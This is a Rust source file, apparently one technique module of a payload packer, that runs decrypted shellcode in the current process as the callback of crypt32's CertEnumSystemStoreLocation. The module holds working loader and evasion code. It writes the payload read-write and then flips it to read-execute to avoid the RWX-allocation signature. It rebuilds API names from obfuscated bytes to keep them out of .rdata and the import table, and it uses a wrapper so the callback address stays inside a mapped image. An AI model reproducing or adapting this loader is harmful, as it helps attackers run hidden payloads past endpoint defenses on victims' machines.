// --- Callback execution (technique fragment) ---
//
// Runs the decrypted payload as the callback of a legitimate system enumeration
// API (`CertEnumSystemStoreLocation`, crypt32) in the current process: the
// payload is entered from a call the system makes itself, not from a thread the
// loader created. The callback returns FALSE, which stops the enumeration, so
// the API returns and the loader keeps control (schema 6 can chain steps after
// this one).
//
// The callback itself is a small compiled function of this module: it runs the
// payload once, records its exit code and stops the enumeration. Pointing the
// API straight at the payload would hand the payload's return value to the
// enumeration (any non-zero value keeps it enumerating, i.e. runs the payload
// again) and would blame the module for a callback address in private memory;
// the wrapper keeps the callback address inside a mapped image while the
// payload keeps its own exit code.
//
// Only `format: shellcode` payloads can run this way: there is no image to map
// and no import table to resolve. `is_pe_image` turns a PE payload into a
// diagnostic instead of a jump into a DOS header; the packer's build-time rule
// for that combination is still missing (see the technique README).

use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, AtomicI32, Ordering};

use windows::core::PCSTR;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows::Win32::System::Threading::GetCurrentProcess;

/// Entry point signature of the payload: position-independent code that returns
/// the exit code (the same contract the shellcode runner of `reflective_loading`
/// uses).
type ShellcodeEntry = unsafe extern "system" fn() -> u32;

/// `PFN_CERT_ENUM_SYSTEM_STORE_LOCATION`:
/// `BOOL (CALLBACK *)(LPCWSTR pwszStoreLocation, DWORD dwFlags, void *pvReserved,
/// void *pvArg)`.
///
/// crypt32's declarations are not part of the `windows` feature set the stub
/// links, so the prototype is declared here. `extern "system"` is stdcall on
/// x86, where the callee pops the arguments, so the list must match the Win32
/// prototype argument for argument.
type EnumStoreLocationCallback =
    unsafe extern "system" fn(*const u16, u32, *const c_void, *const c_void) -> i32;

/// `BOOL CertEnumSystemStoreLocation(DWORD dwFlags, void *pvArg, PFN_... pfnEnum)`.
type FnCertEnumSystemStoreLocation =
    unsafe extern "system" fn(u32, *const c_void, EnumStoreLocationCallback) -> i32;

/// What the callback needs, reached through the enumeration's `pvArg`: the
/// payload's entry point, a guard so it cannot run twice, and its exit code.
///
/// `repr(C)` because the value is reached through a `*const c_void` the system
/// API hands back. The two atomics keep the callback's writes visible to the
/// loader without relying on raw pointers being disjoint: the callback runs on
/// the calling thread, inside the enumeration call.
#[repr(C)]
struct CallbackContext {
    /// Entry point of the payload in its executable region.
    entry: ShellcodeEntry,
    /// Set before the payload is entered: a second invocation (the API's
    /// decision, not the loader's) must not run the payload again.
    ran: AtomicBool,
    /// The payload's exit code, read once the enumeration has returned.
    exit_code: AtomicI32,
}

/// Runs `image` as the callback of a system enumeration API and returns the
/// payload's exit code.
pub fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    if image.is_empty() {
        return Err($MSG_EMPTY$);
    }
    if is_pe_image(image) {
        return Err($MSG_NOT_SHELLCODE$);
    }
    crate::tech_dbg!(
        "execution_callbacks",
        "{} bytes of shellcode queued for callback execution",
        image.len()
    );

    // The payload runs in *this* process and reads its command line from the
    // PEB, so repoint it at `<exe> <yaml args> <runtime args>` first, exactly
    // like the other in-process execution techniques.
    crate::patch_command_line()?;

    let entry = map_payload(image)?;
    crate::tech_dbg!(
        "execution_callbacks",
        "payload mapped read+execute at {:#x}",
        entry as usize
    );

    let enumerate = resolve_enumeration()?;

    let context = CallbackContext {
        entry,
        ran: AtomicBool::new(false),
        exit_code: AtomicI32::new(i32::MIN),
    };

    // The callback runs on this thread, inside the enumeration call. The API
    // returns FALSE when a callback stopped the enumeration, which is exactly
    // what ours does on every invocation, so its return value carries no
    // information here.
    let _stopped = unsafe {
        enumerate(
            0,
            &context as *const CallbackContext as *const c_void,
            callback,
        )
    };

    if !context.ran.load(Ordering::SeqCst) {
        // The enumeration had nothing to hand the callback, so the payload never
        // ran. Reporting a made-up exit code would be worse than failing.
        return Err($MSG_NEVER_ENUMERATED$);
    }
    let code = context.exit_code.load(Ordering::SeqCst);
    crate::tech_dbg!("execution_callbacks", "payload returned {code}");
    Ok(code)
}

/// The callback the system invokes: runs the payload once and returns FALSE so
/// the enumeration stops and control comes back to the loader.
unsafe extern "system" fn callback(
    _location: *const u16,
    _flags: u32,
    _reserved: *const c_void,
    argument: *const c_void,
) -> i32 {
    if argument.is_null() {
        return 0;
    }
    // SAFETY: `argument` is the `pvArg` passed to `CertEnumSystemStoreLocation`
    // in `execute_payload` below, i.e. a `&CallbackContext` that outlives this
    // call. The callback only reads `entry` and writes through the atomics.
    let context = unsafe { &*(argument as *const CallbackContext) };
    if context.ran.swap(true, Ordering::SeqCst) {
        return 0; // already ran: only stop the enumeration
    }
    crate::tech_dbg!("execution_callbacks", "callback invoked, entering the payload");
    // SAFETY: `entry` points into the read+execute region `map_payload` filled
    // with the decrypted payload, whose contract is `fn() -> u32`.
    let code = unsafe { (context.entry)() };
    context.exit_code.store(code as i32, Ordering::SeqCst);
    0 // FALSE: stop enumerating, return to the loader
}

/// Copies `shellcode` into a fresh allocation, flips it to read+execute and
/// returns its entry point.
///
/// The region is intentionally leaked: the payload may have spawned work that
/// outlives the enumeration call (the same lifetime rule the shellcode runner
/// of `reflective_loading` follows).
fn map_payload(shellcode: &[u8]) -> Result<ShellcodeEntry, String> {
    let process: HANDLE = unsafe { GetCurrentProcess() };
    let mut base: *mut c_void = std::ptr::null_mut();
    let mut region = shellcode.len();
    // The helper is safe: the `unsafe` lives inside the syscall layer, so a
    // technique fragment never repeats it.
    let status = crate::nt_alloc_vm(
        process,
        &mut base,
        0,
        &mut region,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_READWRITE.0,
    );
    if status < 0 || base.is_null() {
        return Err(format!("{} (0x{:08x})", $MSG_ALLOC_FAILED$, status as u32));
    }
    // SAFETY: the allocation is `shellcode.len()` bytes of read+write memory
    // (the size came back in `region`), so the copy stays inside it.
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), base as *mut u8, shellcode.len());
    }

    // No RWX page is ever live: the payload is written while the region is
    // read+write and only then made executable, so the classic "private RWX
    // allocation" signature never appears.
    let mut previous = 0u32;
    let status = crate::nt_protect_vm(
        process,
        base,
        shellcode.len(),
        PAGE_EXECUTE_READ.0,
        &mut previous,
    );
    if status < 0 {
        return Err(format!(
            "{} (0x{:08x})",
            $MSG_PROTECT_FAILED$,
            status as u32
        ));
    }

    // SAFETY: `base` starts a read+execute region holding the payload, whose
    // contract is `fn() -> u32`. The address is only ever called through this
    // type (see `callback`).
    Ok(unsafe { std::mem::transmute(base as usize) })
}

/// Resolves `crypt32.dll!CertEnumSystemStoreLocation`.
///
/// Both names are rebuilt at runtime from obfuscated bytes, so neither the
/// library nor the entry point reaches the stub's `.rdata`, and the call never
/// appears in the loader's IAT: the lookup adds only the
/// `LoadLibraryA`/`GetProcAddress` pair that every dynamic resolution needs.
fn resolve_enumeration() -> Result<FnCertEnumSystemStoreLocation, String> {
    let library_name =
        std::ffi::CString::new($CRYPT32_DLL_DEF$).map_err(|_| $MSG_BAD_LIBRARY_NAME$)?;
    let entry_name =
        std::ffi::CString::new($ENUM_ENTRY_DEF$).map_err(|_| $MSG_BAD_ENTRY_NAME$)?;
    let library = unsafe { LoadLibraryA(PCSTR(library_name.as_ptr() as *const u8)) }
        .map_err(|_| $MSG_LIBRARY_MISSING$)?;
    let address = unsafe { GetProcAddress(library, PCSTR(entry_name.as_ptr() as *const u8)) }
        .ok_or_else(|| $MSG_ENTRY_MISSING$)?;

    // SAFETY: the export has the documented `CertEnumSystemStoreLocation`
    // prototype, which `FnCertEnumSystemStoreLocation` mirrors exactly (see the
    // type's comment); both are function pointers of pointer size.
    Ok(unsafe { std::mem::transmute_copy(&(address as usize)) })
}

/// Whether `image` looks like a PE image rather than flat shellcode.
///
/// This technique can only enter raw code, so a PE payload would jump into its
/// DOS header. The packer rejects that combination at build time once
/// `plan::validate` learns the rule; until then this is the diagnostic.
fn is_pe_image(image: &[u8]) -> bool {
    const MZ: [u8; 2] = [0x4D, 0x5A];
    const PE: [u8; 4] = [0x50, 0x45, 0x00, 0x00];
    // `e_lfanew` (the offset of the PE header) lives at 0x3C of the DOS header.
    const E_LFANEW: usize = 0x3C;

    if image.len() < E_LFANEW + 4 || image[..MZ.len()] != MZ {
        return false;
    }
    let e_lfanew = u32::from_le_bytes([
        image[E_LFANEW],
        image[E_LFANEW + 1],
        image[E_LFANEW + 2],
        image[E_LFANEW + 3],
    ]) as usize;
    e_lfanew
        .checked_add(PE.len())
        .is_some_and(|end| end <= image.len() && image[e_lfanew..end] == PE)
}
